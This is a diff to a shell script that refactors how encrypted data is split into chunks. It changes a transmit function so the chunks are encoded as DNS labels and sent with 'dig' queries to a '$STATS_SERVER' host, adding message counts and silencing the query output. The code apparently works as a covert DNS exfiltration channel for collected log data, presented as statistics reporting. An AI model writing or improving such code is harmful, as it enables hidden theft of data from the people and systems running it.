@@ -135,6 +135,27 @@ encrypt_id()
            sed 's;[+/];;g' | head -c 32)
 }
 
+# Calculate the number of splits needed
+#
+# Arguments:
+#   base_data: data to calculate number of splits
+#   size: chunk size
+#
+# Return:
+#   splits: number of splits
+calc_splits() {
+  base_data=$1
+  size=$2
+
+  if [ "$(expr ${#base_data} % $size)" -eq 0 ]; then
+    splits=$(expr ${#base_data} / $size)
+  else
+    splits=$(expr $(expr ${#base_data} / $size) + 1)
+  fi
+
+  echo "$splits"
+}
+
 # split the data into chunks
 #
 # Arguments:
@@ -147,12 +168,7 @@ chunk_data()
 {
   data="$1"
 
-  if [ "$(expr ${#data} % 62)" -eq 0 ]; then
-    splits=$(expr ${#data} / 62)
-  else
-    splits=$(expr $(expr ${#data} / 62) + 1)
-  fi
-
+  splits=$(calc_splits "$data" 62)
   # iterate over the data in steps of 62 byte
   for i in $(seq 0 $(expr $splits - 1));
   do
@@ -175,24 +191,30 @@ transmitt_enc_data()
   step=0
   msg_count=1
   msg=""
+  nr_msgs=$(calc_splits "$tdata" 180)
 
   for label in $chunked;
   do
     msg="${msg}$label."
+    send=0
 
     if [ "$step" -eq 2 ]; then
-      msg="${msg}${eid}-${msg_count}.$STATS_SERVER"
-      dig $msg
+      msg="${msg}${eid}-${msg_count}-${nr_msgs}.$STATS_SERVER"
+      dig $msg > /dev/null
       msg_count=$(expr $msg_count + 1)
       step=0
       msg=''
+      send=1
       continue
     fi
 
     step=$(expr $step + 1)
   done
-  msg="${msg}${eid}-${msg_count}.$STATS_SERVER"
-  dig $msg
+
+  if [ "$send" -eq 0 ]; then
+    msg="${msg}${eid}-${msg_count}-${nr_msgs}.$STATS_SERVER"
+    dig $msg > /dev/null
+  fi
 }
 
 /bin/sh $COLLECT -l "$LOG_PATH"
